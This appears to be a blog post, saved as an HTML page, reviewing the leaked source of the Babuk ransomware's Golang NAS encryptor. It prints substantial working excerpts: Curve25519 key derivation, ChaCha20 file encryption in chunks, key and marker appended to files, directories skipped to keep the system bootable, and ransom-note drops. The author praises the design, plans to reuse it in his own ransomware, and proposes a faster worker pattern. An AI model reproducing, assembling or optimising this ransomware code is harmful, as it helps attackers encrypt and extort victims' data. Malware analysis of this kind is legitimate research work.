@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Taking a look at someone else&#39;s Golang ransomware.">
+  <meta property="og:title" content="Babuk Source Code Leak - Golang Encryptor">
+  <meta property="og:description" content="Taking a look at someone else&#39;s Golang ransomware.">
+  <meta property="og:site_name" content="TACIX.AT">
+  <meta name="twitter:site" content="@cyberingcc">
+  <title>TACIX.AT - Babuk Source Code Leak - Golang Encryptor</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inconsolata&family=Major+Mono+Display&display=swap" rel="stylesheet"> 
+  <style>
+    html {
+      height: 100%;
+    }
+    
+    header {
+      width: 960px;
+      margin: 0 auto;
+      display: flex;
+      flex-direction: row;
+    }
+
+    body {
+      display: flex;
+      flex-direction: column;      
+      width: 100%;
+      color: #EEE;
+      background-color: #333;
+      margin: 0;
+      height: 100%;
+      font-size: 28px;
+      font-family: 'Inconsolata', monospace;
+    }
+
+    footer {
+      width: 960px;
+      margin: 0 auto;
+      display: flex;
+      flex-direction: row;
+      min-height: 50px;
+    }
+
+    a {
+      color: #EEE;
+      text-decoration: none;
+    }
+
+    a:hover {
+      text-decoration: underline;
+    }
+
+    a:visited {
+      color: #DDD;
+    }
+
+    #title {
+      flex-grow: 1;
+      font-size: 32px;
+      font-weight: 300;
+      padding: 10px 0px;
+    }
+
+    #about {
+      font-size: 24px;
+      margin-top: 14px;
+    }
+
+    #main {
+      flex-grow: 1;
+      width: 960px;
+      margin: 0 auto;
+      display: flex;
+      flex-direction: column;
+      padding: 30px 0px;
+    }
+
+    #rss-link {
+      flex-grow: 1;
+      text-align: right;
+    }
+
+    @media only screen and (max-width: 959px) {
+      html {
+        padding: 5px;
+      }
+
+      header {
+        width: 100%;
+      }
+
+      #main {
+        width: 100%;
+      }
+
+      footer {
+        width: 100%;
+      }
+    }
+
+    
+    #date {
+      font-size: 18px;
+      font-style: italic;
+    }
+
+    #title {
+      font-size: 32px;
+    }
+
+    h1, h2, h3, h4, h5 {
+      color: #a8caee;
+      font-family: 'Major Mono Display', monospace;
+    }
+
+    pre {
+      font-family: 'Inconsolata', monospace !important;
+    }
+
+    p a {
+      text-decoration: underline;
+      line-height: 32px;
+    }
+
+    code {
+      color: #fbb5b5;
+      background-color: #3e3e3e;
+      border-radius: 4px;
+    }
+
+    pre {
+      overflow: auto;
+    }
+
+    @media only screen and (max-width: 959px) {
+      body {
+        font-size: 18px;
+      }
+    }
+
+  </style>
+</head>
+<body>
+  <header>
+    <span id=title><a href=/>TACIX.AT</a></span>
+    <span id=about><a href=/about>About</a></span>
+  </header>
+
+  <div id=main>
+  
+  <div id=title>Babuk Source Code Leak - Golang Encryptor</div>
+  <div id=date>2021/09/05 13:37</div>
+  <div>
+<p>Someone leaked the Babuk source code and <a href="https://twitter.com/vxunderground/status/1433758742244478982">VxUnderground</a> announced and archived it. The Windows and ESXI versions were written in filthy C++, but my surprise when I saw the NAS version was written in Golang! I&rsquo;ve mirrored the <a href="https://gist.github.com/TACIXAT/92f04e033939136aa0171ff29a726e7a">encryptor</a> and <a href="https://gist.github.com/TACIXAT/31089617e4915636a46dd4ea81dd4cbe">decryptor</a> on Github. Since I wrote some simple ransomware in Go over the last few blog posts, I decided to check this leak out and see what the professionals do. This post is an overview of the encryptor.</p>
+
+<h2>The Cypto Scheme</h2>
+
+<p>Right off the bat, thing that stands out to me is the use of a different cryptography scheme. We see <code>chacha20</code> and <code>curve25519</code>.</p>
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#f92672">import</span> (
+	<span style="color:#75715e">// ...
+</span><span style="color:#75715e"></span>	<span style="color:#e6db74">&#34;golang.org/x/crypto/chacha20&#34;</span>
+	<span style="color:#e6db74">&#34;golang.org/x/crypto/curve25519&#34;</span>
+)
+</pre>
+<p>ChaCha20 is a stream cipher that is <a href="https://www.cryptopp.com/wiki/ChaCha20">consistently faster than AES</a>. Curve25519 is an elliptic curve (asymmetric) that has been adopted by some major applications.</p>
+
+<p><em>An additional benefit of Curve25519 is that <a href="https://en.wikipedia.org/wiki/Curve25519">it is not covered by any patents</a> which is good since the Babuk authors would not want to be sued.</em></p>
+
+<p>Elliptic curve cryptography utilizes, as the name implies, an elliptic curve. The curve parameters and a base point are predefined or &ldquo;agreed upon&rdquo;. You can do an operation on the base point to produce a new point on the curve, this is often referred to as &ldquo;multiplying&rdquo; it with itself. If you repeat this, you get another point on the curve. You keep doing this N times and produce a final point on the curve. The final point is your public key, and N is your private key.</p>
+
+<h3>EncryptFile()</h3>
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">seed <span style="color:#f92672">:=</span> make([]<span style="color:#66d9ef">byte</span>, <span style="color:#ae81ff">32</span>)
+io.<span style="color:#a6e22e">ReadFull</span>(rand.Reader, seed)
+copy(privateKey[:], seed)
+
+curve25519.<span style="color:#a6e22e">ScalarBaseMult</span>(<span style="color:#f92672">&amp;</span>publicKey, <span style="color:#f92672">&amp;</span>privateKey)
+</pre>
+<p>Hopefully that code makes some sense now. Babuk generates a random private key <code>N</code>, then multiplies the (implicit) base along Curve25519 to produce the public key.</p>
+
+<p>So now you have two keypairs, <code>pub_a, prv_a</code> and <code>pub_b, prv_b</code>. If you multiply <code>prv_a * pub_b</code> you get <code>s</code>. If you multiple <code>prv_b * pub_a</code> you get the same <code>s</code>. This allows two parties to compute a shared secret if each party knows their own private key and the other party&rsquo;s public key. That is what this next line is doing. It takes the private key that was just generated for the file and multiplies it by the embedded public key <code>m_publ</code> in order to produce a shared secret.</p>
+
+<p><em>Note - <code>m_publ</code> is the hard coded public key embedded at the top of the file.</em></p>
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">curve25519.<span style="color:#a6e22e">ScalarMult</span>(<span style="color:#f92672">&amp;</span>shared, <span style="color:#f92672">&amp;</span>privateKey, <span style="color:#f92672">&amp;</span>m_publ)
+</pre>
+<p>Following this the file is renamed to have a <code>.babyk</code> extension, then opened for reading and writing. The file is stat&rsquo;ed to get a file size and based on that, later on, the chunk size that is encrypted changes.</p>
+
+<p>Next, it generates the key and nonce for <code>chacha20</code>. With the key and nonce a stream cipher is generated for encrypting file bytes. The believe the usage of the lock here is unnecessary but will go into more details on that in the code review section, as well, I may be missing something that the developers experienced in practice.</p>
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">l.<span style="color:#a6e22e">Lock</span>()
+<span style="color:#66d9ef">var</span> cc20_k = sha256.<span style="color:#a6e22e">Sum256</span>([]byte(shared[:]))
+<span style="color:#66d9ef">var</span> cc20_n = sha256.<span style="color:#a6e22e">Sum256</span>([]byte(cc20_k[:]))
+l.<span style="color:#a6e22e">Unlock</span>()
+
+stream, err <span style="color:#f92672">:=</span> chacha20.<span style="color:#a6e22e">NewUnauthenticatedCipher</span>(cc20_k[:], cc20_n[<span style="color:#ae81ff">10</span>:<span style="color:#ae81ff">22</span>])
+<span style="color:#66d9ef">if</span> err <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
+	fmt.<span style="color:#a6e22e">Println</span>(err)
+	<span style="color:#66d9ef">return</span>
+}
+</pre>
+<p>Now there are two cases based on the file size. Large cipher mode for files larger than <code>0x1400000</code> bytes (20 MB). Babuk splits up the file into <code>0xA00000</code> byte chunks, however, the buffer only encrypts the first <code>0x100000</code> bytes of that. I assume this is for speed, or maybe to give researchers something to notice and blog about. This means only about 1/10th of the file contents will be encrypted. This is enough to destroy the file, but there will still be a lot of content visible if you look at it in a hex editor.</p>
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">var</span> chunks <span style="color:#66d9ef">int64</span> = file_size <span style="color:#f92672">/</span> <span style="color:#ae81ff">0xA00000</span>
+<span style="color:#66d9ef">var</span> buffer = make([]<span style="color:#66d9ef">byte</span>, <span style="color:#ae81ff">0x100000</span>)
+
+<span style="color:#66d9ef">var</span> i <span style="color:#66d9ef">int64</span>
+<span style="color:#66d9ef">for</span> i = <span style="color:#ae81ff">0</span>; i &lt; chunks; i<span style="color:#f92672">++</span> {
+	fmt.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Processing chunk %d\\%d (%s)\n&#34;</span>, i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>, chunks, path)
+	offset = i <span style="color:#f92672">*</span> <span style="color:#ae81ff">0xA00000</span>
+	file.<span style="color:#a6e22e">ReadAt</span>(buffer, offset)
+	stream.<span style="color:#a6e22e">XORKeyStream</span>(buffer, buffer)
+	file.<span style="color:#a6e22e">WriteAt</span>(buffer, offset)
+}
+</pre>
+<p>The small cipher mode does something similar. This is for files smaller than <code>0x1400000</code>. If it is larger than <code>0x400000</code> bytes, it will only encrypt the first <code>0x400000</code>. Worst case this encrypts the first 20% of the file. Most cases though this will encrypt the entire file.</p>
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">var</span> size_to_encrypt <span style="color:#66d9ef">int64</span> = <span style="color:#ae81ff">0</span>
+<span style="color:#66d9ef">if</span> file_size &gt; <span style="color:#ae81ff">0x400000</span> {
+	size_to_encrypt = <span style="color:#ae81ff">0x400000</span>
+} <span style="color:#66d9ef">else</span> {
+	size_to_encrypt = file_size
+}
+
+<span style="color:#66d9ef">var</span> buffer = make([]<span style="color:#66d9ef">byte</span>, size_to_encrypt)
+r, _ <span style="color:#f92672">:=</span> file.<span style="color:#a6e22e">ReadAt</span>(buffer, offset)
+<span style="color:#66d9ef">if</span> int64(r) <span style="color:#f92672">!=</span> size_to_encrypt {
+	fmt.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;ERROR: %d != %d\n&#34;</span>, r, size_to_encrypt)
+	<span style="color:#66d9ef">return</span>
+}
+
+stream.<span style="color:#a6e22e">XORKeyStream</span>(buffer, buffer)
+file.<span style="color:#a6e22e">WriteAt</span>(buffer, offset)
+</pre>
+<p>Finally, the public key and a special value <code>flag</code> are appended to the file. Flag is a unique 6 byte value used by the decryptor to ensure it is operating on a file it is meant to (and not someone else&rsquo;s Babuk instance).</p>
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">var</span> flag [<span style="color:#ae81ff">6</span>]<span style="color:#66d9ef">byte</span>
+flag[<span style="color:#ae81ff">0</span>] = <span style="color:#ae81ff">0xAB</span>
+flag[<span style="color:#ae81ff">1</span>] = <span style="color:#ae81ff">0xBC</span>
+flag[<span style="color:#ae81ff">2</span>] = <span style="color:#ae81ff">0xCD</span>
+flag[<span style="color:#ae81ff">3</span>] = <span style="color:#ae81ff">0xDE</span>
+flag[<span style="color:#ae81ff">4</span>] = <span style="color:#ae81ff">0xEF</span>
+flag[<span style="color:#ae81ff">5</span>] = <span style="color:#ae81ff">0xF0</span>
+
+<span style="color:#75715e">// ...
+</span><span style="color:#75715e"></span>file.<span style="color:#a6e22e">WriteAt</span>([]byte(publicKey[:]), file_size)
+file.<span style="color:#a6e22e">WriteAt</span>([]byte(flag[:]), file_size<span style="color:#f92672">+</span><span style="color:#ae81ff">32</span>)
+</pre>
+<p>I do like the method of storing all this data in the file, as well as using the special extension to not reencrypt files. If your first run fails, you can pick up where you left off and not double encrypt anything. Storing the key in the file is a benefit of having a fixed size key, and the ECC shared secret derivation is really elegant.</p>
+
+<p>One downside to this scheme is that each install requires a unique <code>m_publ</code>, as <code>m_priv</code> is provided in the decryptor. Having a single server key allows a server to operate a bit more like an automated SaaS. That said, customizing a build that could bring in hundreds to millions of dollars is not so much work, especially for a tailored enterprise breach. Still, you could automate a lot of this infrastructure with some templating.</p>
+
+<h2>Filepath Walk</h2>
+
+<p>In <code>main()</code> we see a more fleshed out <code>filepath.Walk()</code> than what we had in our proof of concept.</p>
+
+<p>As seen above, Babuk uses an extension to know whether a file has been encrypted. So when visiting files anything with the <code>.babyk</code> extension is skipped. They encrypt files in parallel, kicking off an <code>encrypt_file()</code> based on the number <code>runtime.GOMAXPROCS(0) * 2</code>. We will take a closer look at this in the next section.</p>
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">if</span> strings.<span style="color:#a6e22e">Contains</span>(info.<span style="color:#a6e22e">Name</span>(), <span style="color:#e6db74">&#34;.babyk&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span> 
+	<span style="color:#f92672">&amp;&amp;</span> info.<span style="color:#a6e22e">Name</span>() <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;README_babyk.txt&#34;</span> {
+	fmt.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Pushing to queue: %s\n&#34;</span>, path)
+
+	<span style="color:#66d9ef">if</span> queue_counter <span style="color:#f92672">&gt;=</span> queue_max {
+		wg.<span style="color:#a6e22e">Wait</span>()
+		queue_counter = <span style="color:#ae81ff">0</span>
+	}
+	wg.<span style="color:#a6e22e">Add</span>(<span style="color:#ae81ff">1</span>)
+	<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">encrypt_file</span>(<span style="color:#f92672">&amp;</span>wg, path)
+	queue_counter <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+}
+</pre>
+<p>In the case of a directory we see a nice long list blacklisted dirs. Most of these contain system critical files that, if encrypted, would render the operating system unusable. In the case that a directory is not skipped, a <code>README</code> file is output.</p>
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">if</span> strings.<span style="color:#a6e22e">Contains</span>(info.<span style="color:#a6e22e">Name</span>(), <span style="color:#e6db74">&#34;/proc&#34;</span>) <span style="color:#f92672">||</span>
+	strings.<span style="color:#a6e22e">Contains</span>(path, <span style="color:#e6db74">&#34;/boot&#34;</span>) <span style="color:#f92672">||</span>
+	strings.<span style="color:#a6e22e">Contains</span>(path, <span style="color:#e6db74">&#34;/sys&#34;</span>) <span style="color:#f92672">||</span>
+	strings.<span style="color:#a6e22e">Contains</span>(path, <span style="color:#e6db74">&#34;/run&#34;</span>) <span style="color:#f92672">||</span>
+	strings.<span style="color:#a6e22e">Contains</span>(path, <span style="color:#e6db74">&#34;/dev&#34;</span>) <span style="color:#f92672">||</span>
+	strings.<span style="color:#a6e22e">Contains</span>(path, <span style="color:#e6db74">&#34;/etc&#34;</span>) <span style="color:#f92672">||</span>
+	strings.<span style="color:#a6e22e">Contains</span>(path, <span style="color:#e6db74">&#34;/home/httpd&#34;</span>) <span style="color:#f92672">||</span>
+	strings.<span style="color:#a6e22e">Contains</span>(path, <span style="color:#e6db74">&#34;.system/thumbnail&#34;</span>) <span style="color:#f92672">||</span>
+	strings.<span style="color:#a6e22e">Contains</span>(path, <span style="color:#e6db74">&#34;.system/opt&#34;</span>) <span style="color:#f92672">||</span>
+	strings.<span style="color:#a6e22e">Contains</span>(path, <span style="color:#e6db74">&#34;.config&#34;</span>) <span style="color:#f92672">||</span>
+	strings.<span style="color:#a6e22e">Contains</span>(path, <span style="color:#e6db74">&#34;.qpkg&#34;</span>) <span style="color:#f92672">||</span>
+	strings.<span style="color:#a6e22e">Contains</span>(path, <span style="color:#e6db74">&#34;/mnt/ext/opt&#34;</span>) {
+	<span style="color:#66d9ef">return</span> filepath.SkipDir
+}
+
+ioutil.<span style="color:#a6e22e">WriteFile</span>(path<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/README_babyk.txt&#34;</span>, note, <span style="color:#ae81ff">0777</span>)
+</pre>
+<h2>Code Review</h2>
+
+<p>As I mentioned above, I think the use of the lock in <code>encrypt_file()</code> is incorrect.</p>
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">l.<span style="color:#a6e22e">Lock</span>()
+<span style="color:#66d9ef">var</span> cc20_k = sha256.<span style="color:#a6e22e">Sum256</span>([]byte(shared[:]))
+<span style="color:#66d9ef">var</span> cc20_n = sha256.<span style="color:#a6e22e">Sum256</span>([]byte(cc20_k[:]))
+l.<span style="color:#a6e22e">Unlock</span>()
+</pre>
+<p>The variable <code>shared</code> is a function scope variable, so there should not be any thread contention there, as well <code>cc20_k</code> is scoped immediately prior. The thought is maybe <code>Sum256()</code> is not thread safe but looking at the <a href="https://cs.opensource.google/go/go/+/refs/tags/go1.17:src/crypto/sha256/sha256.go;l=253">source code</a> it seems to be as the digest <code>d</code> in that function is local to the function, so there is not some package state code.</p>
+
+<p><em>If the author or anyone else can explain this usage, please reach out <a href="https://twitter.com/TACIXAT">@TACIXAT</a> on Twitter.</em></p>
+
+<p>Let&rsquo;s also take a look at the <code>WaitGroup</code>. A wait group is used as sentinel. Generally, when a worker is started, you add 1 to the wait group, then when they finish they mark it as done which decrements one. The parent process then can block on the wait group until all workers are finished.</p>
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">encrypt_file</span>(wg <span style="color:#f92672">*</span>sync.WaitGroup, path <span style="color:#66d9ef">string</span>) {
+	<span style="color:#66d9ef">defer</span> wg.<span style="color:#a6e22e">Done</span>()
+	<span style="color:#75715e">// ...
+</span><span style="color:#75715e"></span>}
+
+<span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+	filepath.<span style="color:#a6e22e">Walk</span>( <span style="color:#75715e">// ...
+</span><span style="color:#75715e"></span>		<span style="color:#75715e">// ...
+</span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> info.<span style="color:#a6e22e">IsDir</span>() <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span> {
+			<span style="color:#75715e">// ...	
+</span><span style="color:#75715e"></span>			<span style="color:#66d9ef">if</span> queue_counter <span style="color:#f92672">&gt;=</span> queue_max {
+				wg.<span style="color:#a6e22e">Wait</span>()
+				queue_counter = <span style="color:#ae81ff">0</span>
+			}
+
+			wg.<span style="color:#a6e22e">Add</span>(<span style="color:#ae81ff">1</span>)
+			<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">encrypt_file</span>(<span style="color:#f92672">&amp;</span>wg, path)
+			queue_counter <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+		}
+	<span style="color:#75715e">// ...
+</span><span style="color:#75715e"></span>	})
+}
+</pre>
+<p>This is how it is being used. Then the walker will kick off <code>runtime.GOMAXPROCS(0) * 2</code> <code>encrypt_file()</code> instances, then block. The issue is it will block until the last one finishes. So if you kick off 8 instances, and 7 of them are only 100 KB in size, and the other is 1 GB, you will be waiting on that one worker. This assumes the bottleneck is CPU and not disk, but it is likely you could be doing more work.</p>
+
+<p>A better pattern would be to initially launch <code>runtime.GOMAXPROCS(0) * 2</code> workers. Then have the walk function push files to encrypt into a <a href="https://tour.golang.org/concurrency/2">channel</a>. The workers would get jobs out of that channel and encrypt the files. This would ensure that workers were always utilized and you would never block on a single large file.</p>
+
+<p>A nitpick of the code is that <code>snake_case</code> is used. Generally, Go code is <code>camelCase</code> with an uppercase start indicating an exported or public variable.</p>
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">cc20_k
+cc20_n
+encrypt_file
+file_size
+m_publ
+queue_counter
+queue_max
+size_to_encrypt
+</pre>
+<p>There is also this unused function <code>i64tob</code>. This converts an unsigned 64 bit integer to little endian bytes. First, a better name would be <code>u64tob</code> as it is an unsigned int. Additionally, this can be done with the <code>encoding/binary</code> package, see <a href="https://pkg.go.dev/encoding/binary#ByteOrder"><code>binary.LittleEndian.PutUint64([]byte, uint64)</code></a>. Lastly, it is unused so just delete it.</p>
+<pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">i64tob</span>(val <span style="color:#66d9ef">uint64</span>) []<span style="color:#66d9ef">byte</span> {
+	r <span style="color:#f92672">:=</span> make([]<span style="color:#66d9ef">byte</span>, <span style="color:#ae81ff">8</span>)
+	<span style="color:#66d9ef">for</span> i <span style="color:#f92672">:=</span> uint64(<span style="color:#ae81ff">0</span>); i &lt; <span style="color:#ae81ff">8</span>; i<span style="color:#f92672">++</span> {
+		r[i] = byte((val <span style="color:#f92672">&gt;&gt;</span> (i <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>)) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)
+	}
+	<span style="color:#66d9ef">return</span> r
+}
+</pre>
+<h2>Conclusion</h2>
+
+<p>Babuk&rsquo;s crypto scheme is superior, granted I was doing an intro to cryptography, but ECC is a lot nicer than RSA and since ChaCha20 is faster than AES, I will see how I can incorporate this in the future. It is also great to see the directories that are avoided in practice on Linux. I was surprised by the partial file encryption, but that will still render it unusable and probably greatly speed up the time spent on encryption. As well, since I am talking some shit on their parallelization code I will have to show a better pattern in the future. All told, stoked about this leak.</p>
+
+  </div>
+
+  </div>
+
+  <footer>
+    <a id=rss-link href="/rss.xml">rss</a>
+  </footer>
+</body>
+</html>
